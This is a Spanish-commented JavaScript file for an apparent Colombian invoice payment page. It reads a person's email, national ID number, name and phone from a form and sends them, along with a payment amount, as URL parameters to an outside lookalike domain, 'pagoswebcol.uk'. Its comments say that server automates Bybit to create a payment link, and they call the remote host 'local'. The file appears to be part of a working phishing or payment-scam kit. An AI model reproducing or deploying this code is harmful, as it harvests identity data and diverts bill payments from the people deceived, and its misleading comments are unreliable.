// pago.js - Adaptado para Petición HTTP GET al servidor local

const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
let loadingInterval;

document.addEventListener('DOMContentLoaded', () => {
    // 1. Obtener los datos correctamente del localStorage
    const data = JSON.parse(localStorage.getItem('datosFactura')) || {};

    // 2. SE MUESTRAN LOS DATOS EN LAS ETIQUETAS DE TEXTO (PANEL DE RESUMEN)
    if (document.getElementById('lblNombre') && data.nombreCompleto) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
    if (document.getElementById('lblId') && data.numId) document.getElementById('lblId').textContent = "CC - " + enmascararID(data.numId);
    if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
    if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;

    // 3. LOS INPUTS DONDE SE ESCRIBE QUEDAN TOTALMENTE LIMPIOS Y VACÍOS
    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = "";
    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = "";
    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = "";
    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = "";

    // 4. Se define el monto a pagar (usa el del localStorage o 520000 por defecto)
    const monto = data.montoPagar || 520000;
    const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);

    if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
    if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
    if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
});

// ==========================================
// FINALIZAR PAGO Y ENVIAR PETICIÓN AL SERVIDOR
// ==========================================
const botonPagar = document.querySelector('.btn-pay');

if (botonPagar) {
    botonPagar.addEventListener('click', function() {
        const email = document.getElementById('formCorreo').value.trim();
        const doc   = document.getElementById('formNumId').value.trim();
        const name  = document.getElementById('formNombre').value.trim();
        const phone = document.getElementById('formCelular').value.trim();

        // Validaciones básicas locales
        if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
        if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
        if (!name || name.length < 3) { alert("Nombre inválido."); return; }
        if (!phone || phone.length < 7) { alert("Celular inválido."); return; }

        // Pantalla de carga mientras se hace la redirección
        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('dynamicLoadingText');
        
        if (overlay) overlay.style.display = 'flex';
        loadingInterval = animateLoadingText(loadingText);

        // Se captura el monto final
        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
        const amount = data.montoPagar || 520000;

        // Construir la URL con los parámetros que requiere tu backend de Node.js
        const url = new URL('https://apifinacjs.pagoswebcol.uk/meter');
        url.searchParams.append('amount', amount);
        url.searchParams.append('email', email);
        url.searchParams.append('doc', doc);
        url.searchParams.append('fullName', name);
        url.searchParams.append('phone', phone);

        // Redirigir la ventana a la ruta local. 
        // El servidor local automatizará Bybit y emitirá el res.redirect(linkDePago).
        window.location.href = url.toString();
    });
}

// ==========================================
// FUNCIONES AUXILIARES
// ==========================================
function animateLoadingText(element) {
    if (!element) return null;
    const messages = ["Conectando con el servidor...", "Generando link de pago...", "Validando transacción..."];
    let i = 0;
    return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
}

function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
function enmascararCorreo(email) {
    if(!email) return "";
    const [user] = email.split("@");
    return user.substring(0, 2) + "*******@*****.com";
}
